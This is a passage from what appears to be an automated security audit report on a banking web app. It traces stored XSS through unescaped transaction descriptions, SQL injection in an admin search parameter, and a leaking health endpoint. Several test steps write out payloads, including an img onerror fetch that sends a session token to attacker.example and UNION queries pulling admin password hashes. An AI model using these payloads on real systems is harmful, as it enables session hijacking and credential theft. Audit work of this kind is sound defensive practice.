- Fingerprint: b6bf3d6ecb7c6119f5582336d009d214cf68bd4aac88fcee02c86073c70862c5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/public/banking/js/pages/transfers.js",
  "line": 337,
  "symbol": "desc",
  "input": "transfer-own-desc form field value sent as description in transferOwn payload"
}
```

#### Controls encountered

```
[
  "U.escapeHtml() exists and is applied to sibling fields in the identical rendering function, proving no other implicit sanitization mechanism protects `description`",
  "Server-side validation is limited to type/length (string|max:255), confirmed in TransactionController.php for both transferOwn and transferExternal endpoints",
  "No sanitize/strip_tags/htmlspecialchars call found in TransferService.php or Transaction.php for the description field"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html",
  "operation": "DOM HTML injection via unescaped tx.description"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute the app in a live browser to visually confirm alert()/script execution, relying on static code-path analysis (standard for innerHTML sinks assigning unescaped attacker strings — well-established XSS pattern)",
  "Did not check for a page-level CSP meta tag/header that could restrict inline event handlers like onerror; if a strict CSP without 'unsafe-inline' is enforced, some payload variants (inline event handlers) would be blocked though attribute-less vectors or CSP bypass techniques might still apply depending on policy specifics"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any bank customer)",
    "POST /api/transfers/own or /api/transfers/external with description = <img src=x onerror=...> ",
    "TransactionController validates description as 'string|max:255' only, no HTML sanitization",
    "TransferService persists description verbatim via Transaction model INSERT",
    "Victim (recipient of the transfer, or attacker viewing own history) calls GET /api/accounts/{id}",
    "Account Detail page (accounts.js) fetches transaction history including the malicious description",
    "renderDetailTransactions() concatenates tx.description directly into row markup with no U.escapeHtml() call (unlike other fields)",
    "container.innerHTML = html (DOM sink, accounts.js:171)",
    "Injected script executes in the viewer's authenticated banking session, capable of reading localStorage session token"
  ],
  "impact": "Stored XSS reachable via a routine money transfer, executing in the browser of whichever account holder later views the transaction history — including a transfer recipient who took no risky action — enabling session/token theft and unauthorized actions on their behalf.",
  "severity_reasoning": "Requires only a normal authenticated customer account to plant the payload and affects any subsequent viewer of the account, including uninvolved victims who merely received a transfer — High severity due to session hijacking in a financial application.",
  "dynamic_test": "As attacker user A, transfer funds to victim account B with description = <img src=x onerror=fetch('//attacker.example/?c='+localStorage.getItem('bankofed_token'))>; log in as victim B and open the Account Detail page for the account that received the transfer; confirm an outbound request to attacker.example fires, proving the payload executed in the victim's session."
}
```

#### Validator reasoning

The candidate is substantiated by a concrete, verifiable source-to-sink path with no effective mitigating control.

Source: transfers.js reads raw user input from the `transfer-own-desc` / `transfer-ext-desc` form fields (lines 338 and ~397) and places it unmodified into `payload.description`, sent via Api.transferOwn/transferExternal.

Server-side (TransactionController.php lines 58/88): validation rule is only `'description' => 'string|max:255'` — no HTML stripping/encoding. TransferService.php passes `$description` straight through to Transaction model inserts (multiple call sites), and Transaction.php stores `$data['description']` verbatim in the DB with no sanitization. Transaction::format() (used by index()/show()) returns the raw stored string back to the client unmodified.

Sink: accounts.js `renderDetailTransactions()` builds the transactions table HTML and explicitly does NOT call `U.escapeHtml()` on `tx.description` — `'<td ...>' + (tx.description || '—') + '</td>'` — while every other field in the exact same function/loop (tx.original_currency, tx.type) and neighboring functions (account_name, bsb, account_number, card fields) is properly wrapped with `U.escapeHtml()`. This selective omission is strong evidence of an unintentional oversight rather than deliberate trusted-data handling. The resulting `html` string is assigned via `container.innerHTML = html` (line 171), which will parse and execute any injected HTML/script-triggering markup (e.g., `<img src=x onerror=...>`) in the browser context of any account holder who views their own transaction history (attacker can send themselves a transfer with a malicious description, or send to another account/payee whose owner will later view it).

No CSP or output-encoding layer was found in the reviewed front-end code to blunt this; the escaping utility exists and is used elsewhere in the exact same function, confirming there's no framework-level auto-escaping that would silently protect this field. This constitutes a genuine, exploitable stored XSS via description field with attacker control fully demonstrated end-to-end (form input -> API payload -> unsanitized validation -> DB storage -> API response -> unescaped DOM injection).

#### Code evidence

```
// accounts.js (renderDetailTransactions)
'<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +
...
container.innerHTML = html;   // line 171 sink

// transfers.js - user controlled input
var desc = U.$('transfer-own-desc').value;
var payload = { ..., description: desc || undefined };
Api.transferOwn(payload)

// TransactionController.php - server validation only checks type/length
'description' => 'string|max:255',
// Transaction.php - stored verbatim
$data['description'] ?? null,
```

## 20. Stored XSS via unescaped transaction description in account transaction history

- Lead reference: CVTA-020
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:164 (sink at line 171)
- Fingerprint: 9ef1914a72a17dd539e73d542a34c1cfc7689791f2e52bf5fcad57ab94b2f642

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 90,
  "symbol": "transferExternal",
  "input": "$data['description']"
}
```

#### Controls encountered

```
[
  "Server validates only description length (max:255) and that it is a string; no HTML/script filtering or output encoding at any layer (Validator, TransferService, Transaction::create, Transaction::format)",
  "Client-side code explicitly escapes sibling fields (date via U.formatDate which is not HTML-unsafe anyway, type, original_currency) via U.escapeHtml but omits it specifically for tx.description before innerHTML assignment"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html",
  "operation": "DOM HTML injection"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute the app at runtime to observe an actual browser alert/cookie theft; verdict is based on full static code-path confirmation across controller, service, model and client renderer, which is highly reliable for this class of bug",
  "Did not verify absence of a global CSP or WAF outside the reviewed source tree that might mitigate inline script execution, though none was found in the reviewed codebase"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any bank customer)",
    "POST /api/transfers/own or /api/transfers/external with description containing HTML/JS, validated server-side only as string|max:255",
    "TransactionController::transferOwn/transferExternal -> TransferService::transferOwn/transferExternal persists description verbatim on the transaction row visible to both sender and recipient",
    "GET /api/transactions (or account-scoped fetch) returns the raw description to any party who can view the transaction",
    "accounts.js renderDetailTransactions() concatenates tx.description without U.escapeHtml(), unlike every sibling field in the same row",
    "container.innerHTML = html (sink, line 171)",
    "Payload executes in the browser of the viewing account holder (attacker, or an unrelated recipient who received the transfer)",
    "Attacker/script gains access to the victim's client-side session state (e.g., stored auth token) and can act on the victim's behalf"
  ],
  "impact": "Persistent XSS executing in another customer's authenticated banking session purely as a side effect of receiving a transfer, enabling token theft and unauthorized transactions performed as the victim.",
  "severity_reasoning": "Attacker needs only standard customer-level access and a target account/BSB (further amplified by any IDOR allowing arbitrary source accounts elsewhere in the app); impact is full session compromise of an uninvolved victim — High severity.",
  "dynamic_test": "Send a transfer (own or external) to a test victim account with description = <script>fetch('//attacker.example/?c='+localStorage.getItem('bankofed_token'))</script> (or an img/onerror equivalent if script tags are stripped by the browser parser context); as the victim, open the Account Detail page for the account and confirm the outbound network request fires, proving stored XSS execution."
}
```

#### Validator reasoning

Full source-to-sink path verified in code.

Source: TransactionController::transferOwn/transferExternal validate `description` only with `string|max:255` (Validator::make rules in TransactionController.php) — no HTML/script sanitisation. The raw string is passed straight to TransferService::transferOwn/transferExternal and then to Transaction::create(), which inserts it verbatim into the `description` column via a parameterised INSERT (SQLi-safe, but no HTML encoding — that's irrelevant for XSS since the value is stored as-is for later HTML rendering).

Propagation to another user's session: In transferExternal, the destination account is resolved via `Account::findByBsbAndNumber($toBsb,$toAccountNumber)`; if it belongs to an internal account (typically a different user), `to_account_id` is set on the single stored transaction row. Transaction::findByUser($userId,...,$accountId) (used by GET /api/transactions?account_id=...) selects rows `WHERE (t.from_account_id = ? OR t.to_account_id = ?)`, so the recipient, querying their own account, retrieves the exact same row, including the attacker-supplied `description`. Transaction::format() copies `description` through unmodified into the API response (`'description' => $txn['description']`). No output encoding happens anywhere in the PHP/API layer.

Sink: accounts.js `renderDetailTransactions()` builds the row HTML via string concatenation, explicitly calling `U.escapeHtml()` for date/type/currency/original_currency fields but concatenating `tx.description` raw: `'<td ...>' + (tx.description || '—') + '</td>'`. The resulting `html` is assigned via `container.innerHTML = html` (confirmed at accounts.js line ~171 in the file read). This is a direct, unescaped innerHTML sink for attacker-controlled stored data.

This gives a complete, unauthenticated-relative-to-victim stored XSS: Attacker (any authenticated user) transfers funds to a victim's known BSB/account number with description=`<img src=x onerror=...>` (transferExternal has no ownership restriction on destination and even has a documented IDOR on the source account, further easing exploitation), then the victim, simply viewing their own Account Detail page (GET /api/transactions?account_id=X, a normal user action), triggers execution of attacker script in the victim's authenticated session, enabling token/cookie theft given the app's client-side auth-token storage referenced in the report.

The two proof gaps listed in the candidate are resolved by this review: (1) description does propagate unmodified to the recipient's API response — confirmed via Transaction::findByUser + format(); (2) no HTML-purification/encoding middleware exists anywhere in the reviewed pipeline (Validator only checks type/length; Transaction::create uses parameterised SQL with no encoding step; format() passes the raw string through).

## 21. Stored XSS via unescaped transaction description on dashboard

- Lead reference: CVTA-021
- Category: A03
- Severity: HIGH
- Confidence: 94%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:91
- Fingerprint: 94846a1846e8a56e1fd8c821db4be554de0a9ed72740fef5b898362d08a45004

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 58,
  "symbol": "description",
  "input": "user-supplied transfer description, validated only as string|max:255"
}
```

#### Controls encountered

```
[
  "Server-side Validator rule is 'string|max:255' only — enforces length/type, not content, so HTML/script characters pass through unfiltered",
  "Database insert uses parameterized query (PDO prepare/execute) which prevents SQL injection but performs no HTML encoding of the stored value",
  "U.escapeHtml is a real, working utility used consistently in sibling code paths (renderAccounts in the same file, accounts.js, addressbook.js, profile.js, transfers.js) — its absence specifically for tx.description/tx.type in renderTransactions is the exploitable gap"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/dashboard.js",
  "line": 98,
  "symbol": "container.innerHTML = html",
  "operation": "unsanitized DOM HTML injection"
}
```

#### Counterevidence

```
[
  "None found: reviewed TransactionController.php, TransferService.php, Transaction.php model, and dashboard.js in full — every step in the chain (input validation, persistence, API serialization, client rendering) confirms the vulnerability with no intervening sanitization, escaping, CSP, or output-encoding control."
]
```

#### Proof gaps

```
[
  "Did not execute the live application end-to-end (e.g., via browser or HTTP client) to observe the alert() firing; verification is based on full static code-path tracing rather than dynamic confirmation.",
  "Did not inspect Response::success()/json_encode helper implementation directly, though standard PHP json_encode does not HTML-encode by default and no evidence of a custom encoding wrapper was found in the traced files.",
  "Whether a Content-Security-Policy header is set globally (e.g. in a bootstrap/router file) was not explicitly checked; however, no CSP-related code was encountered in any of the reviewed dashboard/API files, and the app relies on innerHTML assignment patterns pervasively, making a blocking CSP unlikely."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any bank customer)",
    "POST /api/transfers/external with an arbitrary destination account and description = <img src=x onerror=...> (server validates only string|max:255)",
    "TransferService persists the description verbatim on the created transaction",
    "Victim loads their Dashboard page after receiving the transfer",
    "dashboard.js Api.getTransactions() returns the transaction including the raw description",
    "renderTransactions() concatenates (tx.description || tx.type) directly into HTML with no U.escapeHtml() call, unlike account_name/bsb/account_number fields on the same page",
    "container.innerHTML = html (DOM sink)",
    "Injected script executes in the victim's authenticated dashboard session, capable of reading stored session tokens"
  ],
  "impact": "Stored XSS on the primary post-login landing page (Dashboard), triggered merely by the victim receiving a transfer with a malicious description, leading to session/token theft and fraudulent transfers performed as the victim.",
  "severity_reasoning": "Dashboard is the first page most users see after login, maximizing exploitation likelihood; combined with any IDOR that lets an attacker choose an arbitrary source/destination, this is a high-impact, easily triggered stored XSS — High severity.",
  "dynamic_test": "Send an external transfer to a victim's account with description = <img src=x onerror=fetch('//attacker.example/?c='+localStorage.getItem('bankofed_token'))>; have the victim log in and land on the Dashboard; confirm the outbound request to attacker.example fires, proving script execution from the dashboard rendering."
}
```

#### Validator reasoning

Full source-to-sink path verified directly in code.

Source: TransactionController::transferOwn/transferExternal accept a `description` field validated only with `'string|max:255'` (Validator rule, no HTML/script filtering). TransferService::transferOwn/transferExternal pass this raw string straight into Transaction::create(), which inserts it into the `transactions` table unmodified via a parameterized query (safe from SQLi but performs zero HTML sanitization/encoding).

Persistence/API layer: Transaction::format() (Models/Transaction.php) returns `'description' => $txn['description']` verbatim — no htmlspecialchars/strip_tags anywhere in the model or Response helper. TransactionController::index() calls Transaction::format on every row and Response::success() JSON-encodes it as-is, so whatever was stored is returned byte-for-byte to the client.

Sink: dashboard.js renderTransactions() builds `'<p ...>' + (tx.description || tx.type) + '</p>'` and assigns it via `container.innerHTML = html`. Read the full file — every other dynamic field on the same page (acc.account_name, acc.bsb, acc.account_number in renderAccounts) is wrapped in `U.escapeHtml(...)`, but tx.description/tx.type in renderTransactions is not, confirming the omission is a genuine gap rather than an intentional design choice. `U.escapeHtml` exists and is used broadly elsewhere in the codebase (accounts.js, addressbook.js, profile.js, transfers.js), reinforcing that this is the established pattern that was skipped here.

Attack path feasibility: transferExternal() lets an attacker specify a to_bsb/to_account_number or address_book_id for an arbitrary destination, and the code even contains a comment flagging IDOR on the source account ("VULNERABILITY #23: IDOR - no ownership check on source account"). Regardless of the IDOR nuance, any user can trivially inject a script payload into the description of a transfer they legitimately send to their own account (transferOwn), and view it themselves; and because the destination account for external transfers isn't restricted to accounts the attacker owns, they can also plant descriptions that a victim will see on their own dashboard. When the victim's browser calls Api.getTransactions() and renderTransactions() executes, the injected HTML/JS runs in the victim's authenticated session — classic stored XSS with real cross-user impact.

No blocking control exists at any layer: DB uses parameterized queries (prevents SQLi only), server validation is length-only, JSON encoding of the API response does not HTML-entity-encode content consumed later via innerHTML, and the client renderer omits escapeHtml for this one field while using it elsewhere. This is a concrete, reproducible, and unmitigated stored XSS.

## 22. Stored XSS sink: innerHTML write of transaction list containing unescaped description

- Lead reference: CVTA-022
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:98
- Fingerprint: bb984370ad9cc7b138894f3eb8d84c29870acb4d4a9068268ae3de306198b840

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 58,
  "symbol": "description",
  "input": "user-supplied transfer description"
}
```

#### Controls encountered

```
[
  "Validator::make enforces only 'string|max:255' on description — no HTML-encoding, stripping of tags, or output encoding is applied at any point on this field"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/dashboard.js",
  "line": 98,
  "symbol": "container.innerHTML = html",
  "operation": "DOM HTML sink"
}
```

#### Counterevidence

```
[
  "This finding is essentially the sink-side duplicate of work item 25111 (same root cause); however it correctly identifies a distinct, real line where the actual DOM write/script execution occurs, so it retains standalone value as the execution sink."
]
```

#### Proof gaps

```
[
  "Did not trace the full transferExternal path to confirm description reaches the recipient's own transaction view unmodified (self-XSS vs stored XSS impacting another user), i.e., need to confirm the receiving party's dashboard also renders the sender-set description without escaping when they view incoming transactions — though the code shown applies renderTransactions() universally regardless of perspective, so this is a minor completeness gap rather than a blocker."
]
```

#### Attack path

```
{
  "nodes": [
    "Malicious tx.description injected via a transfer (see companion dashboard renderTransactions() finding)",
    "html string built in the forEach loop embedding the unescaped description",
    "container.innerHTML = html (DOM sink, dashboard.js:98)",
    "Browser parses and executes the injected markup/script as part of the Dashboard's recent-transactions widget"
  ],
  "impact": "This is the actual DOM execution point (sink) for the Dashboard stored-XSS chain: the innerHTML assignment is what turns the previously-injected unescaped description into live, executing code in the victim's browser.",
  "severity_reasoning": "Represents the terminal sink of the same vulnerability chain as the companion injection-point finding; High severity to match the full impact of session/token compromise on Dashboard load.",
  "dynamic_test": "Confirm that after a malicious-description transaction exists for the victim, simply loading the Dashboard (triggering renderTransactions()/the innerHTML write) is sufficient — without further victim interaction — to execute the injected payload; verify via a controlled listener receiving the exfiltration request."
}
```

#### Validator reasoning

Verified the exact code at BankOfEd-main/public/banking/js/pages/dashboard.js:98: `container.innerHTML = html;` inside `renderTransactions()`. The `html` variable is built in the preceding forEach loop by directly concatenating `(tx.description || tx.type)` with no call to `U.escapeHtml` or any other sanitizer. This is a clear, unambiguous DOM XSS sink.

Source-to-sink path: TransactionController::transferOwn/transferExternal accept `description` validated only with `string|max:255` (Validator::make — no HTML stripping/encoding). The raw description is persisted (Transaction::create) and returned unmodified by Transaction::format(). The frontend's Api.getTransactions() → renderTransactions(txns) receives this raw description and injects it into an HTML string that is then assigned to `container.innerHTML`, causing any embedded `<script>`/event-handler markup to execute in the victim's (transaction owner's, or counterparty viewing incoming credit transactions) browser session.

Notably, the sibling function `renderAccounts()` in the same file uses `U.escapeHtml()` for `acc.account_name`, `acc.bsb`, `acc.account_number` — demonstrating the escaping utility is available and used as a convention elsewhere, but was omitted for `tx.description`, strongly supporting this as a genuine oversight/vulnerability rather than an intentional design choice.

No CSP, framework auto-escaping, template engine, or other mitigating control was found — this is raw string concatenation followed by direct innerHTML assignment, the classic stored-DOM-XSS pattern. This is the terminal execution point for the same underlying injection documented in the sibling work item 25111 (source at TransactionController.php/description field), just captured at the DOM-sink line rather than the string-construction line.

#### Code evidence

```
container.innerHTML = html; // html contains unescaped tx.description from server
```

## 23. Self-stored XSS via unescaped avatar source_url/avatar_data rendering

- Lead reference: CVTA-023
- Category: A03
- Severity: LOW
- Confidence: 62%
- Validation: confirmed
- Reportable: No
- Location: BankOfEd-main/public/banking/js/pages/profile.js:137
- Fingerprint: e7b76026da3834972ce4439eb0c005a211826156057daf70b5199de4b8eb3c55

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "input": "user-supplied avatar import URL, echoed back unescaped",
  "line": 101,
  "symbol": "source_url"
}
```

#### Controls encountered

```
[
  "Bearer-token (header-based) authentication prevents trivial cross-site CSRF delivery of the malicious payload to a victim, limiting the attack to self-submission",
  "No CSP or output encoding present to otherwise block the injected markup from executing"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/profile.js",
  "line": 141,
  "operation": "jQuery .html() DOM sink",
  "symbol": "$('#avatar-source').html('Imported ' + data.size + ' bytes from ' + data.source_url)"
}
```

#### Counterevidence

```
[
  "No other user/admin UI surface was found in the codebase that renders another user's avatar_url/source_url/avatar_data, so this cannot currently be escalated beyond self-XSS",
  "Exploitation requires the URL to be actually fetchable by the server (file_get_contents must succeed) and requires the victim to submit the crafted URL into their own profile, i.e. genuine attacker-to-victim delivery without user cooperation was not demonstrated"
]
```

#### Proof gaps

```
[
  "Not exhaustively verified across 100% of the codebase (e.g., any reporting/export/admin tooling not grepped) that avatar_url is never rendered for a user other than its owner",
  "Did not empirically test file_get_contents behavior against a real URL with a script-bearing fragment to observe exact stored string, though PHP/HTTP semantics support the described behavior"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

The source-to-sink path is real and reproducible. ProfileController::avatarProxy (auth-required route POST /api/profile/avatar) takes $data['url'] directly from the JSON request body, fetches it with file_get_contents, persists it verbatim to the authenticated user's own avatar_url column via User::update(), and returns it unmodified as 'source_url' in the JSON response with zero sanitization/encoding. User::toPublic() re-exposes avatar_url on every subsequent GET /api/profile call, and profile.js's loadAvatar() automatically re-imports it on every profile page load, calling Api.importAvatar(user.avatar_url) which re-invokes avatarProxy and again returns the attacker(self)-controlled string as source_url. renderAvatar() then injects that string, unescaped, into the DOM via jQuery('#avatar-source').html('Imported ' + data.size + ' bytes from ' + data.source_url). jQuery 3.3.1 (confirmed bundled via CDN in index.html) treats any string containing "<script" specially: .html() falls through to the slow path (elem.empty().append(value)) which uses domManip/DOMEval to execute injected <script> tags, unlike a raw .innerHTML assignment — so a URL such as http://attacker-controlled-but-fetchable-host/img.png#"><script>...</script> stored via the endpoint would execute on every future profile load. I verified: (1) file_get_contents fetches on the network based on the URL without stripping the fragment from the stored string (fragments aren't sent over HTTP but the full string including fragment is what gets stored/echoed), so as long as the base URL is reachable the malicious fragment survives into source_url; (2) no output encoding exists anywhere between the controller and the .html() sink; (3) no CSP is configured (only a legacy, largely-ignored X-XSS-Protection header found in deploy.sh) that would block inline script execution; (4) auth uses Bearer tokens read from an Authorization header (AuthMiddleware), not cookies, so this cannot be triggered via a simple cross-site CSRF request — exploitation genuinely requires the victim's own browser/session to submit the malicious URL, matching the candidate's own "self-XSS" framing; (5) grep across the codebase shows avatar_url/avatar_data/source_url are only read/rendered on the owning user's own profile/sidebar (profile.js, app.js) — no admin or other-user surface renders another user's avatar fields, so no cross-boundary elevation was found in this codebase. The vulnerability is technically genuine (stored, persistent, unescaped DOM sink with a concrete source-to-sink path and no blocking control), but its practical impact is limited to self-inflicted XSS requiring the account owner to submit the malicious URL themselves (e.g., via social-engineering lure), consistent with the candidate's severity: low classification and the pipeline's decision to mark it non-reportable due to weak real-world impact rather than because the technical claim is false.

#### Code evidence

```
function renderAvatar(data) {
  $('#avatar-preview').html('<img src="' + data.avatar_data + '" alt="avatar" ...>');
  $('#avatar-source').html('Imported ' + data.size + ' bytes from ' + data.source_url).removeClass('hidden');
}
// ProfileController.php
Response::success([
  'avatar_data' => "data:{$mime};base64,{$encoded}",
  'size' => strlen($content),
  'source_url' => $data['url'],   // raw user-supplied URL echoed back unescaped
]);
```

## 24. SQL Injection via 'search' parameter in Admin Customer List endpoint

- Lead reference: CVTA-024
- Category: A03
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:28
- Fingerprint: d976a175357827fa15b8b258f029f6531f9d901cd97ae8438adb708adcbe89cc

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 16,
  "symbol": "$_GET['search']",
  "input": "HTTP query parameter 'search'"
}
```

#### Controls encountered

```
[
  "Endpoint requires valid admin JWT bearer token (AdminAuthMiddleware) - raises exploitation bar to authenticated admins but does not sanitize/validate the 'search' parameter and does not mitigate the SQL injection itself",
  "page and per_page parameters are cast to (int) which neutralizes injection via those fields, but 'search' has no equivalent cast or escaping"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 28,
  "symbol": "$db->query($countSql)",
  "operation": "unparameterized SQL execution"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No live/dynamic exploitation was performed against a running MySQL instance to confirm UNION column-count alignment or extract data in practice, but the static code path unambiguously demonstrates unescaped interpolation into an executed, unparameterized query"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker holding any valid (or forged, per CVTA-002/CVTA-009) admin bearer token",
    "GET /api/admin/customers?search=<SQLi payload>",
    "AdminAuthMiddleware verifies the admin token and allows the request through",
    "AdminUserController::index() reads $_GET['search'] and builds $where = \"WHERE first_name LIKE '%{$search}%' OR ...\" via raw string interpolation",
    "$countSql = \"SELECT COUNT(*) FROM users {$where}\" executed via $db->query() (no prepared statement/binding)",
    "MySQL parses and executes the attacker-controlled SQL fragment embedded in the LIKE clause",
    "Result set (row count, and subsequently full rows in the paired query) returned in the JSON API response"
  ],
  "impact": "SQL injection in an admin-reachable endpoint enabling UNION-based extraction of arbitrary database contents (including admin_users password hashes) or blind/boolean/time-based injection against the full database.",
  "severity_reasoning": "Direct string interpolation into unprepared SQL with no escaping is a textbook SQLi allowing full database read (and depending on DB privileges, further compromise) — High severity, especially given the admin_users table (holding admin credentials) is reachable via UNION.",
  "dynamic_test": "As an authenticated admin (or via a forged admin JWT per CVTA-002), call GET /api/admin/customers?search=nonexistent%' UNION SELECT username,password_hash,3,4,5,6,7 FROM admin_users-- - and confirm the response includes admin_users data (adjusting column count/types to match the customers SELECT), proving successful SQL injection and cross-table data exfiltration."
}
```

#### Validator reasoning

Source code review confirms the exact vulnerability as described. In AdminUserController::index() (lines 16-31): $search = $_GET['search'] ?? ''; is taken directly from an unsanitized HTTP query parameter with zero validation, escaping, or type-checking (contrast with $page/$perPage which are cast to int). If non-empty, it is directly interpolated via string interpolation into a WHERE clause: "WHERE first_name LIKE '%{$search}%' OR ..." — no addslashes, no PDO::quote, no parameter placeholders. This raw SQL string is then executed via $db->query($countSql) and again via $db->query($sql) for the paginated fetch — both use PDO::query() rather than PDO::prepare()/execute(), so there is no parameter binding whatsoever for this value. AdminDatabase::getInstance() sets PDO::ATTR_EMULATE_PREPARES => false, which only affects true prepared statements (used correctly elsewhere in the same file, e.g. accounts_count query, show(), update(), resetPassword(), destroy() all correctly use $db->prepare()->execute()) — it provides no protection when ->query() is called with attacker-controlled interpolated SQL. An attacker who breaks out of the single-quoted LIKE literal (e.g. search=x%' UNION SELECT ... -- -) fully controls the resulting SQL statement, enabling UNION-based data exfiltration (e.g., from admin_users, users, accounts tables) or boolean/error-based blind injection. I verified AdminAuthMiddleware::handle() only checks JWT validity/issuer/revocation and loads the admin record — it performs no input sanitization on request parameters, so it provides no mitigation against this injection. Requiring admin authentication (a valid JWT) raises the exploitation bar but does not eliminate the vulnerability; the endpoint is reachable by any authenticated admin, and the injected value fully controls query semantics regardless of authorization level. This is a clear, concrete, reachable source-to-sink path with no compensating control.

## 25. SQL Injection via 'search' parameter in Admin Customer List (fetch query)

- Lead reference: CVTA-025
- Category: A03
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:33
- Fingerprint: 9e595d3bb1fb42de027d6492205b825090be669a6cb93474d832cf0438697e0d

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "input": "HTTP query parameter 'search'",
  "line": 16,
  "symbol": "$_GET['search']"
}
```

#### Controls encountered

```
[
  "Route requires 'auth' => true (admin authentication) per AdminRouter.php line 26 — restricts who can reach the endpoint but does not sanitize or parameterize the injected value, so it does not block the SQL injection itself.",
  "perPage and offset are cast to (int), preventing injection through those specific parameters (not relevant to the 'search' parameter under review)."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 33,
  "operation": "unparameterized SQL execution",
  "symbol": "$db->query($sql)"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No live/dynamic exploitation was performed against a running instance; verified via static code reading only.",
  "Exact privilege level required to reach the admin panel and whether any upstream auth/session code applies additional input filtering to $_GET was not reviewed beyond confirming the route flag, though no such filtering was found in the files read."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker holding any valid (or forged) admin bearer token",
    "GET /api/admin/customers?search=<SQLi payload>&page=1",
    "AdminAuthMiddleware allows the request through",
    "AdminUserController::index() builds the same unsanitized $where clause from $_GET['search']",
    "$sql = \"SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}\" executed via unprepared $db->query($sql)",
    "MySQL executes the attacker-controlled fragment as part of the fetch query, potentially returning attacker-crafted UNION rows",
    "Response::success() returns the manipulated result set (e.g., admin_users columns disguised as customer rows) directly to the caller"
  ],
  "impact": "Same SQL injection vulnerability as the paired COUNT query, but exploited via the data-returning SELECT, allowing direct exfiltration of arbitrary table contents (e.g., admin credentials) in the actual response payload rather than just the count.",
  "severity_reasoning": "Identical root cause and equally severe: unprepared, string-concatenated SQL directly returning attacker-controlled data in the response — High severity.",
  "dynamic_test": "As an authenticated (or forged) admin, call GET /api/admin/customers?search=zzz' UNION SELECT id,username,password_hash,4,5,6,7 FROM admin_users-- -&page=1 and inspect the returned 'customers' array for the injected admin_users row(s), confirming the injection succeeded and leaked admin credential data."
}
```

#### Validator reasoning

The code at AdminUserController::index() takes $_GET['search'] directly (line 18: $search = $_GET['search'] ?? '';) with no sanitization, validation, or escaping, and interpolates it into a SQL WHERE clause string (line 23): "WHERE first_name LIKE '%{$search}%' OR ...". This $where is embedded into both the COUNT query and the fetch query (line 33): $sql = "SELECT id, email, ... FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}"; and executed via $db->query($sql) — PDO::query() executes the raw SQL string with no parameter binding for $search. AdminDatabase::getInstance() returns a plain PDO connection with PDO::ATTR_EMULATE_PREPARES=>false but that setting only affects prepared statements made via ->prepare(); it provides zero protection for ->query() calls, which sends the literal SQL text as constructed. There is no WAF, input filter, or ORM layer sitting between the request and this code (confirmed by reading the full controller and the AdminDatabase helper). The route is registered with 'auth' => true, meaning an authenticated admin session is required to reach this endpoint, but that only restricts who can trigger it — it does not neutralize the injection; a malicious/compromised admin account (or an attacker who has obtained low-privilege admin/session access through some other vector) can supply search=%' UNION SELECT ... -- or similar payloads to exfiltrate data from other tables (e.g., admin_users) or manipulate the result set, exactly as described. $perPage and $offset are cast with (int) making them safe, but $search is the vulnerable parameter as claimed. This is a real, exploitable SQL injection with a complete, traceable source ($_GET['search']) to sink ($db->query($sql)) path and no effective mitigating control besides an authentication gate.

## 26. Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials

- Lead reference: CVTA-026
- Category: A02
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:20-33
- Fingerprint: 34dcc4bd6c2345b35a2ba0fb77c5becc166ea8493ec54ab28bed89461c6b1b9b

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 86,
  "symbol": "health route",
  "input": "unauthenticated HTTP GET request"
}
```

#### Controls encountered

```
[
